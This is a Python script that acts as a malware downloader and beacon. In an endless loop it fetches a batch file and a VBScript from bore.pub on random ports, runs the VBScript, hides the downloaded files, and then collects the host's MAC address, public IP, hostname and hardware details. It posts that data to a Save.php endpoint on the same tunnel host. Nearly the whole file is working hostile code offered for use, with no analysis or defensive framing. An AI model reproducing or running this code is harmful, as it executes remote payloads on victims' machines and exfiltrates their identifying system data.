import os
import requests
import ctypes
import socket
import time
import platform
import psutil
import subprocess
import uuid
import wmi
import concurrent.futures  # Import the 'concurrent.futures' module
import random
import shutil


while True:
    numbers = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
    random_number = random.choice(numbers)
    port = random_number

    # Function to clear the terminal screen based on the operating system
    def clear_screen():
        if os.name == 'nt':  # Windows
            os.system('cls')
        else:  # Non-Windows (e.g., Linux, macOS)
            os.system('clear')
            os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Network | lolcat")

    def send_data_to_url(url, data):
        try:
            response = requests.post(url, data=data)
            return f"Data sent to {url}: {response.text}"
        except Exception as e:
            return f"Error sending data to {url}: {str(e)}"

    try:
        # Step 1: Check if files exist and delete them
        home_directory = os.path.expanduser("~")
        web_page1_path = os.path.join(home_directory, "Script.bat")
        vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")

        if os.path.exists(web_page1_path):
            os.remove(web_page1_path)
        if os.path.exists(vbs_file_path):
            os.remove(vbs_file_path)

        # Step 2: Download the necessary files using requests
        url1 = f"http://bore.pub:{port}/Script.io"
        url2 = f"http://bore.pub:{port}/VBSEX.io"

        response1 = requests.get(url1)
        if response1.status_code == 200:
            with open(web_page1_path, "wb") as file:
                file.write(response1.content)
            print(f"Downloaded and saved web page 1 to {web_page1_path}")
        else:
            print(f"Failed to download web page 1. Status code: {response1.status_code}")
            continue  # Skip to the next iteration if download fails

        response2 = requests.get(url2)
        if response2.status_code == 200:
            with open(vbs_file_path, "wb") as file:
                file.write(response2.content)
            print(f"Downloaded and saved web page 2 to {vbs_file_path}")
        else:
            print(f"Failed to download web page 2. Status code: {response2.status_code}")
            continue  # Skip to the next iteration if download fails

        # Step 3: Run the downloaded scripts
        if os.path.isfile(vbs_file_path):
            os.system(f'cscript.exe "{vbs_file_path}"')

        # Step 4: Hide downloaded files
        def hide_files_windows(file_paths):
            try:
                for file_path in file_paths:
                    os.system(f'attrib +h "{file_path}"')
            except Exception as e:
                print(f"Error hiding files on Windows: {str(e)}")

        def hide_files_unix(file_paths):
            try:
                for file_path in file_paths:
                    os.system(f'chmod 400 "{file_path}"')  # You can adjust file permissions as needed
            except Exception as e:
                print(f"Error hiding files on Unix-based system: {str(e)}")

        # List of downloaded files
        downloaded_files = [web_page1_path, vbs_file_path]

        # Hide downloaded files based on the operating system
        if os.name == 'nt':  # Windows
            hide_files_windows(downloaded_files)
        else:  # Non-Windows (e.g., Linux, macOS)
            hide_files_unix(downloaded_files)

#----------------------------------------------------------------------------------------
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])  # Format the MAC address with colons
        computer = wmi.WMI()
        computer_info = computer.Win32_ComputerSystem()[0]
        os_info = computer.Win32_OperatingSystem()[0]
        proc_info = computer.Win32_Processor()[0]
        gpu_info = computer.Win32_VideoController()[0]
        os_name = os_info.Name.encode('utf-8').split(b'|')[0]
        os_version = ' '.join([os_info.Version, os_info.BuildNumber])
        system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB
        cpu = format(proc_info.Name)
        gpu = format(gpu_info.Name)
        System = platform.system()
        res = platform.release()
        mach = platform.machine()
        pros = platform.processor()
        ram = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
        ip = requests.get('https://checkip.amazonaws.com').text.strip()

        hostname = socket.gethostname()
        data_to_send = {
            "DeviceID": f"{hostname}",
            "IP Address": f"{ip}",
            "System": f"{System} {res}",
            "Mac": f"{mac}",
            "Processor": f"{cpu}",
            "GPU": f"{gpu}",
            "Ram": f"{ram}",
            "Machine": f"{mach}",
        }

        # List of PHP endpoint URLs
        php_urls = [
            f"http://bore.pub:{port}/Save.php"
        ]

        # Use concurrent.futures to send data to all URLs concurrently
        with concurrent.futures.ThreadPoolExecutor() as executor:
            results = executor.map(lambda url: send_data_to_url(url, data_to_send), php_urls)

        # Print the results
        for result in results:
            print(result)

        # Wait for some time before running again
        time.sleep(0)  # Adjust the sleep duration as needed

    except Exception as e:
        print(f"Error: {str(e)}")
